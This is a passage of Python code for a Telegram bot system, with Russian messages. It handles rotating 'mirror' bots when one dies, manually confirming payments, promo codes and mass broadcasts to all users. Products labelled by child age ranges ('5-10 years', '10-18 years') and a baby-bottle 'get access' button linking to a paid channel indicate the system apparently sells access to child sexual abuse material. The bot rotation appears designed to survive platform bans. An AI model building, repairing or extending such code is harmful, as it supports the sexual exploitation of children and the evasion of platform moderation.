        _, tok, uname = row
        alive, real_uname = check_alive(tok)
        if not alive:
            logger_bot.answer_callback_query(call.id, "❌ бот мёртв!", show_alert=True); return
        uname = real_uname or uname
        set_current(tok, uname)
        start_worker(tok)   # ← останавливает старый, запускает новый
        logger_bot.answer_callback_query(call.id, f"✅ переключено на @{uname}")
        edit(f"✅ теперь активный бот: @{uname}", admin_kb())

    elif act.startswith("delmir_"):
        m_id = int(act.split("_")[1])
        row  = get_mirror_by_id(m_id)
        if row:
            _, tok, _ = row
            cur_tok, _ = get_current()
            if tok == cur_tok:
                logger_bot.answer_callback_query(call.id,
                    "❌ нельзя удалить активный бот. сначала переключись на другой.", show_alert=True)
                return
        delete_mirror_by_id(m_id)
        logger_bot.answer_callback_query(call.id, "✅ удалено")
        edit("✅ зеркало удалено", admin_kb())

    # ── Ожидающие оплаты ──────────────────────────────
    elif act == "a_pending":
        rows = dbfa("SELECT id,user_id,username,amount,product,timestamp FROM pending_payments ORDER BY timestamp DESC")
        if not rows: edit("⏳ нет ожидающих оплат", admin_kb()); return
        kb = InlineKeyboardMarkup(row_width=1)
        for pid, uid, uname, amt, prod, ts in rows:
            dt  = datetime.fromtimestamp(ts).strftime("%H:%M %d.%m")
            lab = "5-10л" if prod == "510" else ("10-18л" if prod == "1018" else prod)
            kb.add(InlineKeyboardButton(f"[{dt}] @{uname} — {amt}₽ ({lab})",
                                        callback_data=f"pend_{pid}"))
        kb.add(InlineKeyboardButton("🔙 назад", callback_data="a_stats"))
        edit("⏳ <b>ожидают подтверждения:</b>", kb)

    elif act.startswith("pend_"):
        pid = int(act.split("_")[1])
        row = dbf("SELECT user_id,username,amount,product,screenshot FROM pending_payments WHERE id=?", (pid,))
        if not row: logger_bot.answer_callback_query(call.id, "не найдено", show_alert=True); return
        uid, uname, amt, prod, scr = row
        lab = "5-10 лет" if prod == "510" else ("10-18 лет" if prod == "1018" else prod)
        kb  = InlineKeyboardMarkup(row_width=1)
        if prod == "deposit":
            kb.add(InlineKeyboardButton("💰 ВЫДАТЬ БАЛАНС",  callback_data=f"gb_{pid}"))
        else:
            kb.add(InlineKeyboardButton("🎁 ВЫДАТЬ ДОСТУП",  callback_data=f"ga_{pid}"))
        kb.add(InlineKeyboardButton("❌ ОТКЛОНИТЬ", callback_data=f"gd_{pid}"),
               InlineKeyboardButton("🔙 назад",     callback_data="a_pending"))
        text = f"⏳ <b>оплата #{pid}</b>\n\n👤 @{uname} | {uid}\n📦 {lab}\n💰 {amt}₽"
        if scr:
            try:
                logger_bot.send_photo(cid, scr, caption=text, parse_mode='HTML', reply_markup=kb)
                try: logger_bot.delete_message(cid, mid)
                except: pass
                return
            except: pass
        edit(text, kb)

    # ── Выдать доступ / баланс / отклонить ──────────────
    elif act.startswith("ga_"):
        pid = int(act.split("_")[1])
        row = dbf("SELECT user_id FROM pending_payments WHERE id=?", (pid,))
        if not row: logger_bot.answer_callback_query(call.id, "не найдено", show_alert=True); return
        uid = row[0]
        db("DELETE FROM pending_payments WHERE id=?", (pid,))
        kb2 = InlineKeyboardMarkup()
        kb2.add(InlineKeyboardButton("🍼 ПОЛУЧИТЬ ДОСТУП", url=PAYMENT_CHANNEL))
        _, cur_name = get_current()
        try:
            # отправляем через ТЕКУЩИЙ активный воркер-бот
            token, _ = get_current()
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": uid, "text": "✅ Оплата подтверждена! Жми кнопку:",
                      "reply_markup": {"inline_keyboard": [[{"text": "🍼 ПОЛУЧИТЬ ДОСТУП",
                                                              "url": PAYMENT_CHANNEL}]]}},
                timeout=10
            )
            logger_bot.answer_callback_query(call.id, "✅ доступ выдан")
            edit(f"✅ доступ выдан → {uid}", admin_kb())
        except Exception as e:
            logger_bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)

    elif act.startswith("gb_"):
        pid = int(act.split("_")[1])
        row = dbf("SELECT user_id,amount FROM pending_payments WHERE id=?", (pid,))
        if not row: logger_bot.answer_callback_query(call.id, "не найдено", show_alert=True); return
        uid, amt = row
        db("DELETE FROM pending_payments WHERE id=?", (pid,))
        add_balance(uid, int(amt))
        token, _ = get_current()
        try:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": uid, "text": f"✅ Баланс пополнен на {amt}₽!"},
                timeout=10
            )
        except: pass
        logger_bot.answer_callback_query(call.id, f"✅ {amt}₽ выдано")
        edit(f"✅ баланс {amt}₽ выдан → {uid}", admin_kb())

    elif act.startswith("gd_"):
        pid = int(act.split("_")[1])
        row = dbf("SELECT user_id FROM pending_payments WHERE id=?", (pid,))
        if row:
            uid = row[0]
            db("DELETE FROM pending_payments WHERE id=?", (pid,))
            token, _ = get_current()
            try:
                requests.post(
                    f"https://api.telegram.org/bot{token}/sendMessage",
                    json={"chat_id": uid, "text": "❌ Оплата не подтверждена. Обратитесь в поддержку."},
                    timeout=10
                )
            except: pass
        logger_bot.answer_callback_query(call.id, "✅ отклонено")
        edit("❌ оплата отклонена", admin_kb())

    # ── Рассылка ─────────────────────────────────────────
    elif act == "a_spam":
        db("INSERT OR REPLACE INTO admin_sessions VALUES(?,?)", (ADMIN_ID, "spam"))
        try: logger_bot.delete_message(cid, mid)
        except: pass
        logger_bot.send_message(cid, "📢 отправь текст или фото для рассылки:")

    # ── Промокоды ─────────────────────────────────────────
    elif act == "a_promos":
        promos = dbfa("SELECT code,discount,uses_left FROM promo_codes WHERE is_active=1 AND uses_left>0")
        lines  = "\n".join(f"▫️ {c} — {d}% (осталось: {u})" for c, d, u in promos) if promos else "нет промокодов"
        edit(f"🎟 <b>промокоды</b>\n\n{lines}\n\nсоздать: /promo КОД СКИДКА ЛИМИТ", admin_kb())

@logger_bot.message_handler(commands=['promo'])
def lb_promo(m):
    if str(m.from_user.id) != ADMIN_ID: return
    parts = m.text.split()
    if len(parts) != 4:
        logger_bot.reply_to(m, "❌ /promo КОД СКИДКА ЛИМИТ"); return
    _, code, disc, lim = parts
    try:
        db("INSERT OR REPLACE INTO promo_codes VALUES(?,?,?,?,1)",
           (code.upper(), int(disc), int(lim), int(time.time())))
        logger_bot.reply_to(m, f"✅ {code.upper()} — {disc}%, {lim} раз")
    except:
        logger_bot.reply_to(m, "❌ ошибка")

@logger_bot.message_handler(func=lambda m: True, content_types=['text', 'photo'])
def lb_msg(m):
    if str(m.from_user.id) != ADMIN_ID: return
    row = dbf("SELECT step FROM admin_sessions WHERE user_id=?", (ADMIN_ID,))
    if not row or row[0] != "spam": return
    users = dbfa("SELECT user_id FROM users")
    token, _ = get_current()
    sent = fail = 0
    for (uid,) in users:
        try:
            if m.content_type == 'text':
                requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                              json={"chat_id": uid, "text": m.text, "parse_mode": "HTML"},
                              timeout=5)
            else:
                photo = m.photo[-1].file_id
                requests.post(f"https://api.telegram.org/bot{token}/sendPhoto",
                              json={"chat_id": uid, "photo": photo,
                                    "caption": m.caption or "", "parse_mode": "HTML"},
                              timeout=5)
            sent += 1
            time.sleep(0.05)
        except:
            fail += 1
    logger_bot.reply_to(m, f"✅ рассылка: {sent} отправлено, {fail} ошибок", reply_markup=admin_kb())
    db("DELETE FROM admin_sessions WHERE user_id=?", (ADMIN_ID,))

# =========================================================
#  ЗАПУСК
# =========================================================
def run(bot_inst, name):
    while True:
        try:
            print(f"✅ {name} запущен")
            bot_inst.polling(non_stop=True, interval=2, timeout=30)
        except Exception as e:
            print(f"❌ {name}: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Загружаем текущий токен из БД или используем первый
    token, uname_init = get_current()
    alive, real = check_alive(token)
    if not alive:
        # Стартовый токен мёртв — сразу ищем живой
        set_current(FIRST_WORKER_TOKEN, "worker")
        token = FIRST_WORKER_TOKEN

    set_current(token, real or uname_init)

    # Запускаем единственного воркера
    start_worker(token)

    # Мониторинг в фоне
    threading.Thread(target=monitor_loop, daemon=True).start()

    # Основной и логгер-боты
    threading.Thread(target=run, args=(main_bot,   "основной"), daemon=True).start()
    threading.Thread(target=run, args=(logger_bot, "логгер"),   daemon=True).start()

    print("✅ система запущена. воркер активен:", token[:15], "…")
    while True:
        time.sleep(1)